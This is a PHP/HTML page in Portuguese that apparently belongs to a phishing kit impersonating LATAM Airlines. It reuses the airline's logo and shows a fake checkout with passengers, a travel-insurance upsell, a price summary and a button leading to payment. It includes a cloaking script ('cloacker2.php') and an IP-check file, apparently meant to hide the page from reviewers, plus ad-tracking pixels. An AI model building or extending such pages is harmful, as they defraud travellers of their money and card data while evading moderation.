<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once("api/erroAPI.php");
//include 'verificar.php';
require_once 'config/config.php';
include 'verificarip.php';
include 'cloacker2.php';

$requestUri = $_SERVER['REQUEST_URI'];
$segments = explode('/', trim($requestUri, '/'));
$fullId = $segments[0] ?? null;

if (!$fullId) {
    include __DIR__ . '/erro.php';
    exit;
}
try {
    $stmt = $conexao->prepare("SELECT * FROM links WHERE fullid = :fullid LIMIT 1");
    $stmt->execute(['fullid' => $fullId]);
    $links = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$links) {
        include __DIR__ . '/erro.php';
        exit;
    }

} catch (PDOException $e) {
    erroAPI("Erro geral: " . $e->getMessage());
}

?>
            <?php include('info.php'); ?>

        <?php include('pixelface.php'); ?><?php include('pixeltiktok.php'); ?><?php include('utmify.php'); ?>
<html >
	<?php include('head.php'); ?>
<body>
    <!--HIDDEN-->
    <span id='local' class='display-none'>passageiros</span>
    <!-- FIXEDS -->
    <section id='mobile_fixeds'>

    </section>
    <section id='desktop_fixeds'>

    </section>
    <header>
        <section id='mobile_header'>
            <img src='https://s.latamairlines.com/images/header/logo/DesktopNegative.svg'>
            <!-- <i class="material-icons">&#xe5d2;</i> -->
        </section>
        <section id='desktop_header'></section>
    </header>
    <main>
        <section id='mobile_main'>
            <section id='loading'><div></div></section>
            <!--FIXOS-->
                
            
            <div id='div_passageiros' class='div_passageiros'>
                <h3>Passageiros</h3>
                <div id='passageiros'></div>
            </div>

            <div id='div_seguro_viagem' class='div_seguro_viagem'>
                <h3>Adicione seu seguro viagem e viaje com tranquilidade</h3>
                <div>
                    <label>Quantidade de passageiros<b id='passageiros_seguro_viagem'></b></label>
                    <div class='linha_vertical_seguro'></div>
                    <label>Cobertura por<b id='dias_seguro_viagem'></b></label>
                </div>

                <article class='seguro_viagem'>
                    <h3>Seguro viagem</h3>
                    <span>Valor máximo global <b>USD 100.000</b></span>

                    <div class='incluso_no_seguro'>
                        <div>
                            <img src='https://i.imgur.com/i5OEcbm.png'>
                            <label>Imprevistos médicos<span>Assistência médica por doença e acidente até USD 100.000</span></label>
                        </div>
                        <div>
                            <img src='https://i.imgur.com/i5OEcbm.png'>
                            <label>Problemas com sua bagagem despachada<span>Compensação extra por atraso de 8 horas e extravio até USD 2.000</span></label>
                        </div>
                        <div>
                            <img src='https://i.imgur.com/i5OEcbm.png'>
                            <label>Extensão do período da viagem por repouso forçado<span>Restituição de gastos de hospedagem e passagem aérea para todos os passageiros até USD 5.000</span></label>
                        </div>
                    </div>
                    <div class='beneficios_seguro'>
                        <label>
                            <img src='https://i.imgur.com/QMgUUxa.png'>
                            Acumule milhas
                        </label>
                        <label>Compre e Garanta!</label>
                    </div>
                    <div class='preços_do_seguro'>
                        <span>Valor do seguro viagem</span>
                        <label id='preço_do_seguro_viagem'></label>

                        <button id='adicionar_seguro_viagem' onclick='adicionar_seguro_viagem(this)' ação='adicionar'>Adicionar</button>
                    </div>
                </article>
            </div>

            <div id='resumo' class='resumo'>
                <div>
                    <span>Voos</span>
                    <span id='preço_dos_voos'></span>
                </div>
                <div>
                    <span>Taxas e Impostos</span>
                    <span id='preço_dos_impostos'></span>
                </div>
                <div id='div_preço_seguro_viagem'>
                    <span>Seguro Viagem</span>
                    <span id='preço_do_seguro_viagem-2'></span>
                </div>
                <div>
                    <label>Preço Final</label>
                    <b id='preço_final'></b>
                </div>
                <button onclick='ir_para_pagamento(this)'>Continuar</button>
            </div>

        </section>
    </main>
    <?php include('footer.php'); ?>
</body>
</html>